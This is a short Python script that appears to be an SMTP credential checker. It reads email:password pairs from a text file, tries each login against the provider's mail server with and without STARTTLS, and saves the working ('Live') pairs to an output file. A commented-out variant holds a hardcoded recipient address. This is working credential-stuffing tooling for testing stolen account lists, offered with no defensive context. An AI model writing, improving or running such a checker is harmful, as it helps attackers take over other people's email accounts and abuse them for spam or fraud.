import smtplib
import json

host_json = json.load(open('smtp_hoster.json', 'r'))

def get_host_port(domain):
	host = host_json['hosters'][domain]
	port = host_json['hosterports'][host]

	return host, port

def checking(file_in, file_out):
	fo = open(file_out, 'w')
	with open(file_in, 'r') as f:
		for i in f.readlines():
			task = i.strip().split(':')
			try:
				host, port = get_host_port(task[0].split("@")[1])
			except: continue
			try:
				mail = smtplib.SMTP(host, port)
				mail.login(task[0], task[1])
				mail.close()
				mail.logout()
				fo.write(i)
				print("Live : ", i)
				continue
			except: pass
			try:
				mail = smtplib.SMTP(host, port)
				mail.ehlo()
				mail.starttls()
				mail.login(task[0], task[1])
				mail.close()
				mail.logout()
				print("Live : ", i)
				fo.write(i)
				continue
			except Exception as e:
				print("Error Ehlo:",e)
			print("Die : ", i)

	print("Done")

if __name__ == '__main__':
	from sys import argv

	if len(argv) < 2:
		print("Usage: %s mail_pass.txt result.txt" % argv[0])
		exit()

	checking(argv[1], argv[2])



# def get_host_smtp(t):
#     hostt = hosts_smtp_json['hosters'][t]
#     port = hosts_smtp_json['hosterports'][hostt]

#     return (hostt, port)

# def smtp_check(t):
#     task = t.split(":")
#     to = "rajiorap12@outlook.com"
#     fail = 0
#     try:
#         h = task[0].split("@")[1]
#         hostt, port = get_host_smtp(h)
#     except Exception as e:
#         print(e)
#     # for i in host_smtp:
#     try:
#         mailserver = smtplib.SMTP(hostt, port)
#         mailserver.login(task[0], task[1])
#         mailserver.close()
#         return True
#     except Exception as e:
#         print(e)
#         pass
#     try:
#         mailserver = smtplib.SMTP(hostt, port)
#         mailserver.ehlo()
#         mailserver.starttls()
#         mailserver.login(task[0], task[1])
#         mailserver.close()
#         return True
#     except Exception as e:
#         print(e)
#         pass

#     return False